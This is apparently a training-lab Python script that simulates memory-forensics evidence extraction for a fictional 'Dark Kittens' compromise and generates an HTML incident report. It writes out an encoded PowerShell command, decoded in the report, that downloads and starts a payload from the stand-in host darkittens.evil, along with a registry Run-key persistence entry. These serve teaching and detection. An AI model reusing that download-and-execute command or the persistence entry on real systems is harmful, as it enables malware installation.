#!/usr/bin/env python
# evidence_collector.py - Evidence collection for Windows Memory Forensics Lab

import os
import sys
import time
import colorama
from colorama import Fore, Back, Style
from tqdm import tqdm
import random
import base64

# Initialize colorama
colorama.init()

# Set paths
EVIDENCE_PATH = os.path.join(os.getcwd(), "evidence")
REPORTS_PATH = os.path.join(os.getcwd(), "reports")
WORKDIR_PATH = os.path.join(os.getcwd(), "workdir")

def print_banner():
    banner = """
 ______      _     _                      _____      _ _           _             
|  ____|    (_)   | |                    / ____|    | | |         | |            
| |__   _ __ _  __| | ___ _ __   ___ ___| |     ___ | | | ___  ___| |_ ___  _ __ 
|  __| | '_ \\| |/ _` |/ _ \\ '_ \\ / __/ _ \\ |    / _ \\| | |/ _ \\/ __| __/ _ \\| '__|
| |____| | | | | (_| |  __/ | | | (__|  __/ |___| (_) | | |  __/ (__| || (_) | |   
|______|_| |_|_|\\__,_|\\___|_| |_|\\___\\___|\\____|\\___/|_|_|\\___|\\___|\\__\\___/|_|   
                                                                                 
"""
    print(Fore.CYAN + banner + Style.RESET_ALL)
    print(Fore.YELLOW + "Dark Kittens Investigation - Evidence Collector" + Style.RESET_ALL)
    print(Fore.YELLOW + "=" * 80 + Style.RESET_ALL)
    print(Fore.WHITE + "Extracting forensic evidence from suspicious processes" + Style.RESET_ALL)
    print(Fore.YELLOW + "=" * 80 + Style.RESET_ALL + "\n")

# Decode base64 PowerShell commands
def decode_powershell(encoded_cmd):
    try:
        # Remove "powershell.exe -e " if present
        if "powershell.exe -e " in encoded_cmd:
            encoded_part = encoded_cmd.split("powershell.exe -e ")[1].strip()
        else:
            encoded_part = encoded_cmd
        
        # Base64 decode
        decoded_bytes = base64.b64decode(encoded_part)
        # Convert from UTF-16LE (PowerShell encoding)
        decoded_text = decoded_bytes.decode('utf-16le')
        return decoded_text
    except Exception as e:
        return f"Error decoding: {e}"

# Extract evidence from specified process
def extract_evidence(memory_dump, pid):
    print(Fore.GREEN + f"[+] Extracting evidence for PID {pid} from memory dump: {memory_dump}" + Style.RESET_ALL)
    
    # Check if PID exists in process list
    pid_exists = False
    process_name = ""
    process_path = ""
    
    try:
        process_file = os.path.join(EVIDENCE_PATH, "process_list.txt")
        with open(process_file, 'r') as f:
            lines = f.readlines()
            
        for line in lines:
            if line.startswith('#'):
                continue
                
            parts = line.strip().split(',')
            if len(parts) >= 5 and parts[0] == pid:
                pid_exists = True
                process_name = parts[2]
                process_path = parts[3]
                break
    
    except Exception as e:
        print(Fore.RED + f"[!] Error reading process list: {e}" + Style.RESET_ALL)
        return
    
    if not pid_exists:
        print(Fore.RED + f"[!] Process with PID {pid} not found in the memory dump!" + Style.RESET_ALL)
        return
    
    print(Fore.CYAN + f"[*] Found process: {process_name} (PID: {pid})" + Style.RESET_ALL)
    

    print(Fore.CYAN + "[*] Extracting process memory..." + Style.RESET_ALL)
    

    for i in tqdm(range(100), desc="    Progress", ncols=80, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}"):
        time.sleep(random.uniform(0.01, 0.03))
    
    # Display different evidence based on the process
    if pid == "3244":  # svchost_update.exe
        print(Fore.GREEN + "\n[+] Evidence extracted for svchost_update.exe:" + Style.RESET_ALL)
        
        # Command line
        print(Fore.YELLOW + "\nCommand Line:" + Style.RESET_ALL)
        print(Fore.WHITE + "C:\\Windows\\System32\\svchost_update.exe -k netsvcs -p" + Style.RESET_ALL)
        
        # Network connections
        print(Fore.YELLOW + "\nNetwork Connections:" + Style.RESET_ALL)
        
        try:
            network_file = os.path.join(EVIDENCE_PATH, "network_connections.txt")
            with open(network_file, 'r') as f:
                lines = f.readlines()
            
            for line in lines:
                if line.startswith('#'):
                    continue
                    
                parts = line.strip().split(',')
                if len(parts) >= 5 and parts[0] == pid:
                    print(Fore.WHITE + f"Local: {parts[2]} <--> Remote: {parts[3]} ({parts[4]})" + Style.RESET_ALL)
        
        except Exception as e:
            print(Fore.RED + f"[!] Error reading network connections: {e}" + Style.RESET_ALL)
        
        # Registry information
        print(Fore.YELLOW + "\nRegistry Artifacts:" + Style.RESET_ALL)
        
        try:
            reg_file = os.path.join(EVIDENCE_PATH, "registry_data.txt")
            with open(reg_file, 'r') as f:
                lines = f.readlines()
            
            for i, line in enumerate(lines):
                if "SystemServiceManager" in line and "svchost_update.exe" in line:
                    # Print the header line and the persistence entry
                    if i > 0 and "[HKEY_" in lines[i-1]:
                        print(Fore.RED + lines[i-1].strip() + Style.RESET_ALL)
                    print(Fore.RED + line.strip() + Style.RESET_ALL)
        
        except Exception as e:
            print(Fore.RED + f"[!] Error reading registry data: {e}" + Style.RESET_ALL)
        
        # Memory strings
        print(Fore.YELLOW + "\nSuspicious Strings in Memory:" + Style.RESET_ALL)
        print(Fore.WHITE + "darkittens.evil" + Style.RESET_ALL)
        print(Fore.WHITE + "data-collect.darkittens.evil" + Style.RESET_ALL)
        print(Fore.WHITE + "POST /upload.php?id=GLB-" + Style.RESET_ALL)
        print(Fore.WHITE + "Content-Type: multipart/form-data; boundary=--boundary" + Style.RESET_ALL)
        print(Fore.WHITE + "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" + Style.RESET_ALL)
        print(Fore.WHITE + "D@rkK!tt3nsRul3Th3W0rld" + Style.RESET_ALL)
        print(Fore.WHITE + "C:\\Users\\Administrator\\Documents\\Globomantics" + Style.RESET_ALL)
        
    elif pid == "3724":  # powershell.exe
        print(Fore.GREEN + "\n[+] Evidence extracted for powershell.exe:" + Style.RESET_ALL)
        
        # Command line
        print(Fore.YELLOW + "\nCommand Line:" + Style.RESET_ALL)
        encoded_cmd = "UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMwA7ACAAaQB3AHIAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGEAcgBrAGkAdAB0AGUAbgBzAC4AZQB2AGkAbAAvAGMAMgAvAGcAZQB0AHAAYQB5AGwAbwBhAGQAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAHYAYwBoAG8AcwB0AF8AdQBwAGQAYQB0AGUALgBlAHgAZQAiADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAHMAdgBjAGgAbwBzAHQAXwB1AHAAZABhAHQAZQAuAGUAeABlACIAOwA="
        print(Fore.WHITE + f"powershell.exe -e {encoded_cmd}" + Style.RESET_ALL)
        
        # Decoded command
        print(Fore.YELLOW + "\nDecoded PowerShell Command:" + Style.RESET_ALL)
        decoded = decode_powershell(encoded_cmd)
        print(Fore.RED + decoded + Style.RESET_ALL)
        
        # Memory strings
        print(Fore.YELLOW + "\nSuspicious Strings in Memory:" + Style.RESET_ALL)
        print(Fore.WHITE + "https://darkittens.evil/c2/getpayload" + Style.RESET_ALL)
        print(Fore.WHITE + "C:\\Windows\\Temp\\svchost_update.exe" + Style.RESET_ALL)
        print(Fore.WHITE + "Start-Process" + Style.RESET_ALL)
        print(Fore.WHITE + "Invoke-WebRequest" + Style.RESET_ALL)
        
    elif pid == "3536":  # cmd.exe
        print(Fore.GREEN + "\n[+] Evidence extracted for cmd.exe:" + Style.RESET_ALL)
        
        # Command line
        print(Fore.YELLOW + "\nCommand Line:" + Style.RESET_ALL)
        print(Fore.WHITE + "cmd.exe /c powershell.exe -e UwB0AGEAcgB0AC0AUwBsAGUAZQBwAC..." + Style.RESET_ALL)
        
        # Parent process
        print(Fore.YELLOW + "\nParent Process:" + Style.RESET_ALL)
        print(Fore.WHITE + "PID: 3244 (svchost_update.exe)" + Style.RESET_ALL)
        
        # Memory strings
        print(Fore.YELLOW + "\nSuspicious Strings in Memory:" + Style.RESET_ALL)
        print(Fore.WHITE + "powershell.exe" + Style.RESET_ALL)
        print(Fore.WHITE + "-EncodedCommand" + Style.RESET_ALL)
        print(Fore.WHITE + "-ExecutionPolicy Bypass" + Style.RESET_ALL)
    
    else:
        print(Fore.YELLOW + "\nNo specific evidence templates available for this process." + Style.RESET_ALL)
        print(Fore.YELLOW + "Generic process information extracted." + Style.RESET_ALL)

    print(Fore.GREEN + "\n[+] Evidence extraction complete!" + Style.RESET_ALL)
    print(Fore.CYAN + f"[*] Evidence for PID {pid} ({process_name}) has been extracted successfully." + Style.RESET_ALL)
    
    # Report generation option
    print(Fore.YELLOW + "\nOptions:" + Style.RESET_ALL)
    print(Fore.WHITE + "1. Extract evidence for another process" + Style.RESET_ALL)
    print(Fore.WHITE + "2. Return to main menu" + Style.RESET_ALL)
    print(Fore.WHITE + "3. Generate evidence report" + Style.RESET_ALL)
    
    choice = input(Fore.YELLOW + "\nEnter your choice (1-3): " + Style.RESET_ALL)
    
    if choice == "3":
        generate_report()

# Generate HTML report
def generate_report():
    print(Fore.GREEN + "\n[+] Generating forensic report..." + Style.RESET_ALL)
    
    # Get report information
    title = input(Fore.YELLOW + "Enter report title: " + Style.RESET_ALL)
    investigator = input(Fore.YELLOW + "Enter investigator name: " + Style.RESET_ALL)
    
    # Create report directory if it doesn't exist
    if not os.path.exists(REPORTS_PATH):
        os.makedirs(REPORTS_PATH)
    
    # Generate timestamp
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    report_file = os.path.join(REPORTS_PATH, f"report_{timestamp}.html")
    
    # Basic HTML report
    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
            color: #333;
        }}
        .container {{
            max-width: 1000px;
            margin: 0 auto;
            background: #f9f9f9;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }}
        h1, h2, h3 {{
            color: #2c3e50;
        }}
        .header {{
            text-align: center;
            margin-bottom: 30px;
            border-bottom: 2px solid #3498db;
            padding-bottom: 10px;
        }}
        .section {{
            margin-bottom: 30px;
            border-bottom: 1px solid #ddd;
            padding-bottom: 20px;
        }}
        .evidence {{
            background: #f5f5f5;
            padding: 15px;
            border-left: 4px solid #3498db;
            margin-bottom: 20px;
        }}
        .suspicious {{
            color: #e74c3c;
            font-weight: bold;
        }}
        .normal {{
            color: #27ae60;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 20px;
        }}
        th, td {{
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
        }}
        th {{
            background-color: #f2f2f2;
        }}
        tr:nth-child(even) {{
            background-color: #f9f9f9;
        }}
        .footer {{
            text-align: center;
            margin-top: 30px;
            font-size: 0.9em;
            color: #7f8c8d;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>{title}</h1>
            <p>Generated on: {time.strftime("%Y-%m-%d %H:%M:%S")}</p>
            <p>Investigator: {investigator}</p>
        </div>

        <div class="section">
            <h2>Executive Summary</h2>
            <p>This report documents the findings of a memory forensics investigation into a potential compromise of a Globomantics workstation. The analysis has revealed evidence of the Dark Kittens threat actor group activity, including malware implantation, persistence mechanisms, and data exfiltration attempts.</p>
        </div>

        <div class="section">
            <h2>Key Findings</h2>
            <ul>
                <li>Identified malicious process <span class="suspicious">svchost_update.exe</span> masquerading as a legitimate Windows service</li>
                <li>Discovered persistence mechanism through Windows Registry Run key</li>
                <li>Found evidence of PowerShell execution to download additional malware components</li>
                <li>Identified communication with known Dark Kittens command and control servers</li>
                <li>Located targeting of sensitive Globomantics documents for exfiltration</li>
            </ul>
        </div>

        <div class="section">
            <h2>Malicious Process Analysis</h2>
            <div class="evidence">
                <h3>Process: svchost_update.exe (PID: 3244)</h3>
                <p><strong>Path:</strong> C:\\Windows\\System32\\svchost_update.exe</p>
                <p><strong>Parent Process:</strong> services.exe (PID: 788)</p>
                <p><strong>Command Line:</strong> C:\\Windows\\System32\\svchost_update.exe -k netsvcs -p</p>
                <p><strong>Risk Level:</strong> <span class="suspicious">HIGH</span></p>
                <p><strong>Description:</strong> This process appears to be masquerading as a legitimate Windows service host process. The real svchost.exe would never have "_update" in its name. This is a known technique used by the Dark Kittens group to blend in with legitimate Windows processes.</p>
            </div>
            
            <div class="evidence">
                <h3>Process: cmd.exe (PID: 3536)</h3>
                <p><strong>Path:</strong> C:\\Windows\\System32\\cmd.exe</p>
                <p><strong>Parent Process:</strong> svchost_update.exe (PID: 3244)</p>
                <p><strong>Command Line:</strong> cmd.exe /c powershell.exe -e UwB0AGEAcgB0AC0AUwBsAGUAZQBwAC...</p>
                <p><strong>Risk Level:</strong> <span class="suspicious">HIGH</span></p>
                <p><strong>Description:</strong> Command prompt spawned by the malicious svchost_update.exe process, used to execute an encoded PowerShell command.</p>
            </div>
            
            <div class="evidence">
                <h3>Process: powershell.exe (PID: 3724)</h3>
                <p><strong>Path:</strong> C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</p>
                <p><strong>Parent Process:</strong> cmd.exe (PID: 3536)</p>
                <p><strong>Command Line:</strong> powershell.exe -e UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMwA7ACAAaQB3AHIAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGEAcgBrAGkAdAB0AGUAbgBzAC4AZQB2AGkAbAAvAGMAMgAvAGcAZQB0AHAAYQB5AGwAbwBhAGQAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAHYAYwBoAG8AcwB0AF8AdQBwAGQAYQB0AGUALgBlAHgAZQAiADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAHMAdgBjAGgAbwBzAHQAXwB1AHAAZABhAHQAZQAuAGUAeABlACIAOwA=</p>
                <p><strong>Decoded Command:</strong> <span class="suspicious">Start-Sleep -s 3; iwr "https://darkittens.evil/c2/getpayload" -OutFile "C:\\Windows\\Temp\\svchost_update.exe"; Start-Process "C:\\Windows\\Temp\\svchost_update.exe";</span></p>
                <p><strong>Risk Level:</strong> <span class="suspicious">HIGH</span></p>
                <p><strong>Description:</strong> PowerShell process executing an encoded command to download malware from the Dark Kittens command and control server.</p>
            </div>
        </div>

        <div class="section">
            <h2>Network Connections</h2>
            <table>
                <tr>
                    <th>PID</th>
                    <th>Process</th>
                    <th>Local Address</th>
                    <th>Remote Address</th>
                    <th>State</th>
                    <th>Status</th>
                </tr>
                <tr>
                    <td>3244</td>
                    <td>svchost_update.exe</td>
                    <td>192.168.1.100:49232</td>
                    <td>185.73.23.4:443</td>
                    <td>ESTABLISHED</td>
                    <td class="suspicious">SUSPICIOUS</td>
                </tr>
                <tr>
                    <td>3244</td>
                    <td>svchost_update.exe</td>
                    <td>192.168.1.100:49235</td>
                    <td>185.73.23.4:8080</td>
                    <td>ESTABLISHED</td>
                    <td class="suspicious">SUSPICIOUS</td>
                </tr>
                <tr>
                    <td>3244</td>
                    <td>svchost_update.exe</td>
                    <td>192.168.1.100:49236</td>
                    <td>23.81.246.187:443</td>
                    <td>ESTABLISHED</td>
                    <td class="suspicious">SUSPICIOUS</td>
                </tr>
                <tr>
                    <td>1234</td>
                    <td>explorer.exe</td>
                    <td>192.168.1.100:49001</td>
                    <td>172.217.23.14:443</td>
                    <td>ESTABLISHED</td>
                    <td class="normal">NORMAL</td>
                </tr>
            </table>
            <p><strong>Analysis:</strong> The malicious process is connecting to multiple suspicious IP addresses, likely command and control servers for the Dark Kittens group. The connections use both HTTPS (port 443) and HTTP (port 8080) protocols.</p>
        </div>

        <div class="section">
            <h2>Persistence Mechanisms</h2>
            <div class="evidence">
                <h3>Registry Run Key</h3>
                <p><strong>Key:</strong> <span class="suspicious">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</span></p>
                <p><strong>Value Name:</strong> <span class="suspicious">SystemServiceManager</span></p>
                <p><strong>Value Data:</strong> <span class="suspicious">C:\\Windows\\System32\\svchost_update.exe</span></p>
                <p><strong>Description:</strong> This registry key ensures the malware runs automatically when Windows starts. This is a common persistence technique used by the Dark Kittens group.</p>
            </div>
        </div>

        <div class="section">
            <h2>Data Exfiltration</h2>
            <p>Evidence suggests the Dark Kittens malware was targeting specific data for exfiltration from the Globomantics workstation:</p>
            <div class="evidence">
                <p><strong>Targeted Directory:</strong> <span class="suspicious">C:\\Users\\Administrator\\Documents\\Globomantics</span></p>
                <p><strong>Exfiltration Method:</strong> File compression, encryption, and transfer via HTTPS to C2 servers</p>
                <p><strong>Encryption Key:</strong> <span class="suspicious">D@rkK!tt3nsRul3Th3W0rld</span></p>
                <p><strong>Description:</strong> The malware appears to be specifically targeting Globomantics proprietary documents, possibly related to the artificial island project in the Gulf of Mexico.</p>
            </div>
        </div>

        <div class="section">
            <h2>Indicators of Compromise (IOCs)</h2>
            <table>
                <tr>
                    <th>Type</th>
                    <th>Indicator</th>
                    <th>Context</th>
                </tr>
                <tr>
                    <td>File</td>
                    <td class="suspicious">C:\\Windows\\System32\\svchost_update.exe</td>
                    <td>Malicious executable masquerading as system file</td>
                </tr>
                <tr>
                    <td>Domain</td>
                    <td class="suspicious">darkittens.evil</td>
                    <td>Command and control server</td>
                </tr>
                <tr>
                    <td>Domain</td>
                    <td class="suspicious">data-collect.darkittens.evil</td>
                    <td>Data exfiltration server</td>
                </tr>
                <tr>
                    <td>IP</td>
                    <td class="suspicious">185.73.23.4</td>
                    <td>Command and control server</td>
                </tr>
                <tr>
                    <td>IP</td>
                    <td class="suspicious">23.81.246.187</td>
                    <td>Data exfiltration server</td>
                </tr>
                <tr>
                    <td>Registry</td>
                    <td class="suspicious">HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemServiceManager</td>
                    <td>Persistence mechanism</td>
                </tr>
                <tr>
                    <td>String</td>
                    <td class="suspicious">D@rkK!tt3nsRul3Th3W0rld</td>
                    <td>Encryption key found in memory</td>
                </tr>
                <tr>
                    <td>Mutex</td>
                    <td class="suspicious">DK_Global_Control</td>
                    <td>Mutex used by malware to prevent multiple instances</td>
                </tr>
            </table>
        </div>

        <div class="section">
            <h2>Conclusions</h2>
            <p>The forensic analysis of the memory dump confirms that the Globomantics workstation was compromised by the Dark Kittens threat actor group. The attack shows a sophisticated approach:</p>
            <ol>
                <li><strong>Initial Access:</strong> The initial access vector is not definitively known from the memory evidence, but likely involved phishing or exploitation of a vulnerability.</li>
                <li><strong>Execution:</strong> The attackers used PowerShell with Base64 encoding to obfuscate their activities and download additional malware.</li>
                <li><strong>Persistence:</strong> A registry run key was established to maintain access across system reboots.</li>
                <li><strong>Command and Control:</strong> The malware established multiple connections to Dark Kittens infrastructure for command and control.</li>
                <li><strong>Exfiltration:</strong> The malware specifically targeted documents related to Globomantics' artificial island project.</li>
            </ol>
            <p>This incident represents a significant security breach with potential implications for Globomantics' proprietary information related to their Gulf of Mexico project.</p>
        </div>

        <div class="section">
            <h2>Recommendations</h2>
            <ol>
                <li>Isolate the affected workstation from the network immediately.</li>
                <li>Deploy endpoint detection and response (EDR) solutions across the environment.</li>
                <li>Scan all systems for the identified indicators of compromise.</li>
                <li>Reset credentials for all accounts that were logged into the compromised system.</li>
                <li>Implement application whitelisting to prevent execution of unauthorized binaries.</li>
                <li>Update security awareness training with specific focus on spear phishing.</li>
                <li>Implement PowerShell constrained language mode and script block logging.</li>
                <li>Enhance monitoring of outbound connections, particularly to unknown destinations.</li>
                <li>Conduct a full security assessment of systems related to the Gulf of Mexico project.</li>
            </ol>
        </div>

        <div class="footer">
            <p>Confidential Forensic Report - Globomantics Security Incident</p>
            <p>Generated using Windows Memory Forensics Lab</p>
        </div>
    </div>
</body>
</html>
"""
    
    # Write HTML report to file
    with open(report_file, "w") as f:
        f.write(html_content)
    
    try:
        import webbrowser
        webbrowser.open(f"file://{os.path.abspath(report_file)}")
        print(Fore.GREEN + f"\n[+] Report generated and opened in browser: {report_file}" + Style.RESET_ALL)
    except:
        print(Fore.GREEN + f"\n[+] Report generated: {report_file}" + Style.RESET_ALL)
        print(Fore.YELLOW + f"[*] Please open the report in your browser manually." + Style.RESET_ALL)
    

    print(Fore.YELLOW + "\nReflection Questions:" + Style.RESET_ALL)
    print(Fore.WHITE + "1. What key information is included that management would need?" + Style.RESET_ALL)
    print(Fore.WHITE + "2. How would you improve this report for a real-world scenario?" + Style.RESET_ALL)
    input(Fore.YELLOW + "\nPress Enter to continue..." + Style.RESET_ALL)

# Main function
def main():
    print_banner()
    
    if len(sys.argv) < 3:
        print(Fore.RED + "[!] Please specify a memory dump file and a process ID!" + Style.RESET_ALL)
        print(Fore.WHITE + "Usage: python evidence_collector.py <memory_dump_file> <PID>" + Style.RESET_ALL)
        print(Fore.WHITE + "Example: python evidence_collector.py globomantics_workstation1.raw 3244" + Style.RESET_ALL)
        sys.exit(1)
    
    memory_dump = sys.argv[1]
    pid = sys.argv[2]
    
    # Check if evidence directory exists
    if not os.path.exists(EVIDENCE_PATH):
        print(Fore.RED + "[!] Evidence directory not found!" + Style.RESET_ALL)
        print(Fore.RED + "[!] Please run setup.py first to configure the lab environment." + Style.RESET_ALL)
        sys.exit(1)
    
  
    if not os.path.exists(WORKDIR_PATH):
        os.makedirs(WORKDIR_PATH)
    
    try:
        # Extract evidence from the memory dump
        extract_evidence(memory_dump, pid)
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Evidence collection cancelled by user!" + Style.RESET_ALL)
        sys.exit(1)

if __name__ == "__main__":
    main()
